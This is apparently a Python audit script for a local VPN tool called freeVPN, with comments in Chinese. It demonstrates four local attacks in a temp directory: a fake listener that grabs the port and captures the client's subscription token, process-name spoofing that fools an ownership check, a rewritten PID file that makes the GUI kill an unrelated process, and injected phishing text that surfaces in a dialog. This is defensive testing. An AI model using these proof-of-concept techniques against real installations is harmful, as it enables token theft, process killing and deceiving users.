#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""d6 · GUI 的新表面 + state/ 被第三方写入之后能干什么。

四件事:
  ① 端口抢占: freeVPN 没在跑时, 本机任何用户都能绑 127.0.0.1:<订阅端口>。
     客户端下次拉订阅就把令牌交出去了 —— **不需要读任何文件就能拿到令牌**。
  ② is_freevpn 只是 "freevpn" in (name+cmdline).lower() —— 可被伪装。
  ③ daemon.pid 可被第三方改写 -> 控制台"停止常驻"会 taskkill 那个 PID。
  ④ daemon.log 可被第三方写入 -> 会被原样送进用户的模态弹窗。

全部在 %TEMP% 下做, 不碰 C:\\freeVPN。
用法: python audit/d6_gui_surface.py
"""
import json
import os
import socket
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path

ROOT = Path(r"E:\AI\freeVPN")
sys.path.insert(0, str(ROOT))
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import pool          # noqa: E402
import security as sec  # noqa: E402
import tkinter as tk  # noqa: E402
import gui            # noqa: E402

WORK = Path(tempfile.mkdtemp(prefix="freevpn_d6_"))
# 8899 上会留下 TIME_WAIT, 换一对干净的端口
PORT = 8891
TOKEN = "LEAKTEST_TOKEN_0123456789abcdef"

print("=" * 78)
print("d6 · GUI 新表面 / state 被第三方写入")
print("=" * 78)
print(f"隔离目录: {WORK}\n")

# ------------------------------------------------------- ① 端口抢占 + 令牌截获
print("### ① 抢占订阅端口 -> 直接截获客户端发来的令牌\n")
captured: list[str] = []


def fake_server():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", PORT))
    s.listen(5)
    s.settimeout(12)
    t0 = time.time()
    while time.time() - t0 < 12:
        try:
            c, _ = s.accept()
        except Exception:
            break
        try:
            data = c.recv(4096).decode("utf-8", "replace")
            captured.append(data.split("\r\n")[0])
            body = b"proxies: []\n"
            c.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: text/yaml\r\n"
                      b"Content-Length: " + str(len(body)).encode()
                      + b"\r\nConnection: close\r\n\r\n" + body)
            break        # 截获一次就够了, 赶紧把端口让出来
        except Exception:
            pass
        finally:
            try:
                c.close()
            except Exception:
                pass
    s.close()


th = threading.Thread(target=fake_server, daemon=True)
th.start()
time.sleep(0.5)
print(f"  假服务已绑 127.0.0.1:{PORT} (未验证任何令牌)")
print("  现在模拟客户端拉订阅 (它会把订阅地址整条发过来):")
sub_url = f"http://127.0.0.1:{PORT}/sub/pool.yaml?token={TOKEN}"
r = subprocess.run([r"C:\Windows\System32\curl.exe", "-s", "-o", "NUL",
                    "--max-time", "6", sub_url],
                   capture_output=True, text=True, encoding="utf-8",
                   errors="replace")
time.sleep(0.5)
print(f"    请求 {sub_url[:70]}...")
for line in captured:
    leaked = TOKEN in line
    print(f"  假服务收到: {line}")
    print(f"      → 里面含完整令牌: {'是' if leaked else '否'}")
    print(f"      → 客户端拿到的订阅内容由攻击者决定 (proxies: [])")
if not captured:
    print("  (假服务没收到请求)")

# ------------------------------------------------------- ② is_freevpn 伪装
print("\n### ② is_freevpn 的判据可以被伪装\n")
print("  pool.py:3193-3196:")
print("      low = (name + ' ' + cmdline).lower()")
print("      ... 'is_freevpn': 'freevpn' in low")
print("  → 只要进程名或命令行里出现 'freevpn' 这个词就打上")
print("    「← 另一份 freeVPN」标记, 而那正是弹窗里让用户放心点「是」的标记。\n")

FAKE_PORT = 8892
# 注意: Windows 上 SO_REUSEADDR 是 4 不是 2, 硬编码数值会直接让子进程崩掉 ——
# 这里干脆不设, 反正端口是空的。
time.sleep(1.0)
fake_proc = subprocess.Popen(
    [sys.executable, "-c",
     "import socket,time;s=socket.socket();"
     f"s.bind(('127.0.0.1',{FAKE_PORT}));s.listen(1);time.sleep(30)",
     "freevpn-kernel-helper.exe"],
    creationflags=sec.hidden_flags(), stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL)
time.sleep(2.0)
print(f"  子进程还活着: {fake_proc.poll() is None}")
holders = pool.port_holders(FAKE_PORT)
print(f"  起了一个普通 python 进程, 命令行里塞了 'freevpn-kernel-helper.exe'")
print(f"  占住端口 {FAKE_PORT}, port_holders() 返回 {len(holders)} 条:")
for h in holders:
    print(f"      pid={h['pid']}  name={h['name']!r}  is_freevpn={h['is_freevpn']}")
    print(f"      cmdline={h['cmdline'][:130]!r}")
    print(f"      → 会被标成「另一份 freeVPN」: {'是' if h['is_freevpn'] else '否'}")
    print(f"      → 但它其实是: {Path(sys.executable).name} 起的任意脚本")
if not holders:
    print("      (查不到 —— 本机 wmic 缺失, 回退 tasklist 也只给名字)")

# --- 真实 GUI 实例 (窗口隐藏) ---
gui.STATE = WORK
gui.OUT = WORK / "out"
(gui.OUT).mkdir(parents=True, exist_ok=True)
gui.PoolGUI.autostart_first_run = lambda self: None
gui.PoolGUI.check_confined = lambda self: None
root = tk.Tk()
root.withdraw()
g = gui.PoolGUI(root, FAKE_PORT)

# 用真实的 do_free_port 拼接出用户看到的弹窗文本
print("\n  用真实的 do_free_port() 拼出弹窗内容:")
dlg: list[str] = []
gui.messagebox.askyesno = lambda t, m, **k: (dlg.append(f"{t}|||{m}"), False)[1]
gui.messagebox.showinfo = lambda *a, **k: None
g.run_action = lambda *a, **k: None      # 不要真的去杀
g.busy = False
g.do_free_port(ask=True)
if dlg:
    print(f"      弹窗标题: {dlg[0].split('|||')[0]}")
    for ln in dlg[0].split("|||")[1].splitlines():
        print(f"      | {ln}")
else:
    print("      (没拼出弹窗 —— 占用者列表为空)")

# ------------------------------------------------------- ③ daemon.pid 劫持
print("\n### ③ daemon.pid 被改写 -> 控制台会杀掉那个 PID\n")
victim = subprocess.Popen(
    [sys.executable, "-c", "import time;time.sleep(120)"],
    creationflags=sec.hidden_flags(), stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL)
time.sleep(0.8)
print(f"  受害者进程 (与 freeVPN 无关): PID {victim.pid}, 还活着={victim.poll() is None}")

(WORK / "daemon.pid").write_text(str(victim.pid), encoding="utf-8")
print(f"  第三方把 {WORK / 'daemon.pid'} 写成 {victim.pid}")
print(f"  gui.daemon_pids() 读到: {gui.daemon_pids()}")
print(f"  → 控制台把它当成'自己的常驻进程'了")

asked: list[str] = []
gui.messagebox.askyesno = lambda title, msg, **k: (asked.append(f"{title}|||{msg}"), True)[1]
gui.messagebox.showerror = lambda *a, **k: None
g.set_busy(False)

print("\n  模拟用户点「停止常驻」:")
g.toggle_daemon()
time.sleep(1.5)
print(f"     弹窗内容: {asked[0].splitlines()[0] if asked else '(无)'}")
alive = victim.poll() is None
print(f"     受害者进程 PID {victim.pid} 还活着: {alive}")
print(f"     → 被跨用户数据驱动的 taskkill 打掉了: {'否' if alive else '是'}")

# ------------------------------------------------------- ④ daemon.log -> 弹窗
print("\n### ④ daemon.log 被第三方写入 -> 原样进用户的模态弹窗\n")
LOG = WORK / "daemon.log"
INJECT = [
    "========================",
    "  freeVPN 安全更新提示",
    "  检测到订阅令牌需要重新确认。",
    "  请在弹出的下一个窗口里点「是」以继续。",
    "  官方提示：不要关闭本窗口。",
    "========================",
]
LOG.write_text("\n".join(INJECT) + "\n", encoding="utf-8")
print(f"  第三方往 {LOG} 写了 {len(INJECT)} 行诱导文本")
print(f"  (该文件在真实部署里是 C:\\freeVPN\\state\\daemon.log,")
print(f"   实测 ACL = NT AUTHORITY\\Authenticated Users:(M) —— 任何本机用户可写)")

shown: list[str] = []
gui.messagebox.showerror = lambda title, msg, **k: shown.append(f"{title}|||{msg}")
gui.messagebox.askyesno = lambda title, msg, **k: (shown.append(f"{title}|||{msg}"), False)[1]

# 造一个"启动后立刻退出"的常驻进程, 让 watch_daemon 走失败分支
dead = subprocess.Popen([sys.executable, "-c", "raise SystemExit(1)"],
                        creationflags=sec.hidden_flags(),
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
g.watch_daemon(dead, LOG)
root.after(9000, root.quit)
root.mainloop()
if shown:
    title, _, msg = shown[0].partition("|||")
    print(f"\n  实际弹窗标题: {title}")
    print(f"  实际弹窗内容:")
    for ln in msg.splitlines():
        print(f"      {ln}")
    hit = any(x in msg for x in INJECT)
    print(f"\n  → 第三方写入的文本被原样显示给用户: {'是' if hit else '否'}")
else:
    print("\n  (没捕获到弹窗 —— watch_daemon 可能还在等)")

# ------------------------------------------------------- 清理
print("\n### 清理\n")
try:
    fake_proc.kill()
except Exception:
    pass
try:
    if victim.poll() is None:
        victim.kill()
except Exception:
    pass
try:
    root.destroy()
except Exception:
    pass
import shutil  # noqa: E402
shutil.rmtree(WORK, ignore_errors=True)
print(f"  测试进程已结束, 隔离目录已清理: {WORK}")
raise SystemExit(0)
